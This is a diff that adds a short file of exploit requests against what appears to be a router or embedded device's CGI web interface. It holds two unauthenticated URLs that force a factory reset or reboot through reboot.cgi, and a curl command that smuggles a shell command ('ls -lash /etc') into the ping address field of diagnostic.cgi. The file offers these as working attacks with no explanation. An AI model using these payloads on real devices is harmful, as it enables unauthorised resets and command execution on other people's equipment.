@@ -1,0 +1,10 @@
+Security Bypass:
+
+http://www.example.com/cgi-bin/reboot.cgi?select_option_value=factory_default&reboot_option=on&action=Apply
+http://www.example.com/cgi-bin/reboot.cgi?select_option_value=default_reboot&reboot_option=on&action=Apply
+
+Command Injection:
+
+curl -v --data "select_mode_ping=on&ping_ipaddr=127.0.0.1>/dev/null; ls 
+-lash /etc%23&ping_count=1&action=Apply&html_view=ping" 
+"http://www.example.com/cgi-bin/diagnostic.cgi" > /dev/null
